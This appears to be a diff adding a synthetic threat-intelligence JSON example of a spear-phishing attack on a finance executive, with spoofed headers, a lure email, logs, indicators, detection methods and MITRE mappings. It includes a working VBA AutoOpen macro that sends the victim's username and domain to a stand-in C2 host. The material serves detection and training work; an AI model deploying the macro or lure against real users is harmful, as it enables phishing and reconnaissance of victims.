@@ -1,0 +1,64 @@
+{
+  "examples": [
+    {
+      "scenario": "Spear-phishing email targeted at a corporate finance executive using personalized content and a malicious Excel invoice attachment with embedded macro to exfiltrate credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <spoofed-sender@trustedpartner.com>\r\nReceived: from mail.trustedpartner.com (mail.trustedpartner.com [192.0.2.45])\r\n\tby mail.corporation.com (Postfix) with ESMTPS id 1234ABCD\r\n\tfor <finance.exec@corporation.com>; Tue, 20 Jun 2023 14:22:10 +0000 (UTC)\r\nX-Originating-IP: [198.51.100.23]\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Flag: NO\r\nX-Spam-Status: No, score=0.0\r\nSubject: Invoice 2023-06-20 from Contoso Ltd.\r\nFrom: \"Olivia Johnson\" <olivia.johnson@trustedpartner.com>\r\nTo: finance.exec@corporation.com\r\nMessage-ID: <CA+F7F3a9iT4Zx7f8Op0zR@mail.trustedpartner.com>\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_12345_678901234.1624177330\"",
+        "email_body_plain": "Dear John,\n\nPlease find attached the invoice for your recent purchase from Contoso Ltd. The total amount is $25,600. Please review and process payment at your earliest convenience.\n\nBest regards,\nOlivia Johnson\nAccounts Manager\nContoso Ltd.\n\nPhone: +1-555-123-4567\nEmail: olivia.johnson@trustedpartner.com\n\n---\nNote: If you have any questions, do not hesitate to contact me.",
+        "attachment_info": {
+          "filename": "Invoice_2023-06-20.xlsm",
+          "md5": "9e107d9d372bb6826bd81d3542a419d6",
+          "sha256": "d2d2d2e2f6b7c8d9a0b1234c56789f0123456789abcdefabcdefabcdef12345678",
+          "macro_code_snippet": "Sub AutoOpen()\r\n  Dim http As Object\r\n  Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\n  Dim url As String\r\n  url = \"http://malicious-c2.example.com/collect?data=\" & URLEncode(Environ(\"USERNAME\")) & \"|\" & URLEncode(Environ(\"USERDOMAIN\"))\r\n  http.Open \"GET\", url, False\r\n  http.Send\r\nEnd Sub\r\nFunction URLEncode(ByVal Text As String) As String\r\n  Dim i As Integer\r\n  Dim acode As Integer\r\n  Dim outstr As String\r\n  outstr = \"\"\r\n  For i = 1 To Len(Text)\r\n    acode = Asc(Mid(Text, i, 1))\r\n    If (acode >= 48 And acode <= 57) Or (acode >= 65 And acode <= 90) Or (acode >= 97 And acode <= 122) Then\r\n      outstr = outstr & Chr(acode)\r\n    Else\r\n      outstr = outstr & \"%\" & Hex(acode)\r\n    End If\r\n  Next i\r\n  URLEncode = outstr\r\nEnd Function",
+          "macro_behavior": "On opening the Excel file, the AutoOpen macro sends a silent HTTP GET request to the attacker C2 server containing the victim's Windows username and domain, enabling targeted follow-up attacks."
+        },
+        "smtp_transaction_logs": "220 mail.trustedpartner.com ESMTP Postfix\r\nEHLO mail.trustedpartner.com\r\n250-mail.trustedpartner.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<olivia.johnson@trustedpartner.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<finance.exec@corporation.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>",
+        "url_obfuscation": "http://malicious-c2[.]example[.]com/collect?data=JohnDoe%7CCORPDOMAIN",
+        "domain_registration": {
+          "domain": "malicious-c2.example.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2023-05-15T10:22:00Z",
+          "registrant": {
+            "name": "Privacy Protection Service",
+            "organization": "PrivacyGuardian",
+            "email": "privacy@privacyguardian.com"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "198.51.100.23",
+              "ttl": 3600
+            }
+          ]
+        },
+        "network_capture_excerpt": "Frame 142: 142 bytes on wire (1136 bits), 142 bytes captured (1136 bits) on interface eth0, id 0\nEthernet II, Src: 00:0c:29:3e:5b:a1, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.1.104, Dst: 198.51.100.23\nTransmission Control Protocol, Src Port: 49720, Dst Port: 80, Seq: 1, Ack: 1, Len: 87\nHypertext Transfer Protocol\n    GET /collect?data=JohnDoe%7CCORPDOMAIN HTTP/1.1\r\n    Host: malicious-c2.example.com\r\n    User-Agent: Microsoft Excel Macro\r\n    Accept: */*\r\n    Connection: close\r\n",
+        "mail_server_log_entry": "Jun 20 14:22:12 mail postfix/smtp[23456]: 1A2B3C4D5E: to=<finance.exec@corporation.com>, relay=mail.trustedpartner.com[192.0.2.45]:25, delay=2, delays=0.1/0.01/1.5/0.39, dsn=2.0.0, status=sent (250 2.0.0 Ok: queued as 1234ABCD)",
+        "employee_communication_note": "Unusual request for payment to Contoso Ltd. from a contact previously unknown to the finance executive; email contains personalized references and accurate internal invoice number, increasing likelihood of trust."
+      },
+      "indicators": {
+        "malicious_domain": "malicious-c2.example.com",
+        "malicious_ip": "198.51.100.23",
+        "attachment_hashes": {
+          "md5": "9e107d9d372bb6826bd81d3542a419d6",
+          "sha256": "d2d2d2e2f6b7c8d9a0b1234c56789f0123456789abcdefabcdefabcdef12345678"
+        },
+        "suspicious_macro_keywords": [
+          "AutoOpen",
+          "MSXML2.XMLHTTP",
+          "http://malicious-c2.example.com/collect"
+        ],
+        "email_spoofing": "From: olivia.johnson@trustedpartner.com (spoofed, IP 192.0.2.45 not on corporate allowlist)",
+        "smtp_originating_ip": "198.51.100.23",
+        "unusual_http_requests": "GET /collect?data=JohnDoe|CORPDOMAIN"
+      },
+      "detection_method": "Email gateway anti-spam and anti-phishing rules detecting mismatched SPF/DKIM for trustedpartner.com; sandboxing attachment revealing macro making external HTTP connection; network IDS alert on HTTP GET to suspicious domain; user education prompting verification of unexpected invoice emails via phone.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1113 - Screen Capture (potential later stage after initial compromise)",
+        "T1566 - Phishing"
+      ]
+    }
+  ]
+}
